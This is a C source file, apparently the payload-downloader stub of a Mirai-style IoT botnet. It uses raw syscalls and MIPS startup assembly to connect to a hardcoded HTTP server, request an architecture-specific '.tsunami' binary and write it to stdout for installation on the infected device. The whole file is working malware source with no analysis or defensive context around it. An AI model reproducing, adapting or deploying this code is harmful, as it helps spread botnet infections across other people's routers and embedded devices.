#define _GNU_SOURCE

#include <sys/syscall.h>
#include <netinet/in.h>

#include "headers/main.h"

inline void run(void);

int syscall_socket(int, int, int);
int syscall_write(int, void *, int);
int syscall_read(int, void *, int);
int syscall_connect(int, struct sockaddr_in *, int);
void syscall_exit(int);

#define socket syscall_socket
#define write syscall_write
#define read syscall_read
#define connect syscall_connect
#define __exit syscall_exit

void __start(void)
{
#if defined(MIPS) || defined(MIPSEL)
    __asm
    (
        ".set noreorder\n"
        "move $0, $31\n"
        "bal 10f\n"
        "nop\n"
        "10:\n.cpload $31\n"
        "move $31, $0\n"
        ".set reorder\n"
    );
#endif
    run();
}

inline void run(void)
{
    struct sockaddr_in addr;
    int fd = 0;
    int h = 0;
    char buf[128];

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = HTTP_SERVER;

    if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        __exit(1);

    if(connect(fd, &addr, sizeof(addr)) == -1)
        __exit(1);

    if(write(fd, "GET /" BOT_ARCH ".tsunami HTTP/1.0\r\n\r\n", 23 + ARCH_LEN) < 1)
        __exit(1);

    while(h != 0x0d0a0d0a)
    {
        char tmp;
        int ret = read(fd, &tmp, 1);

        if(ret != 1)
            __exit(1);

        h = (h << 8) | tmp;
    }

    while(TRUE)
    {
        int ret = read(fd, buf, 128);
        if(ret <= 1)
            break;

        write(STDOUT, buf, ret);
    }

    __exit(0);
}

int syscall_socket(int domain, int type, int protocol)
{
    #if defined(__NR_socketcall)
    struct
    {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;

    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);
    return ret;
    #else
    return syscall(SCN(SYS_socket), domain, type, protocol);
    #endif
}

int syscall_read(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int syscall_write(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int syscall_connect(int fd, struct sockaddr_in *addr, int len)
{
    #if defined(__NR_socketcall)
    struct
    {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;

    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);
    return ret;
    #else
    return syscall(SCN(SYS_connect), fd, addr, len);
    #endif
}

void syscall_exit(int code)
{
    syscall(SCN(SYS_exit), code);
}
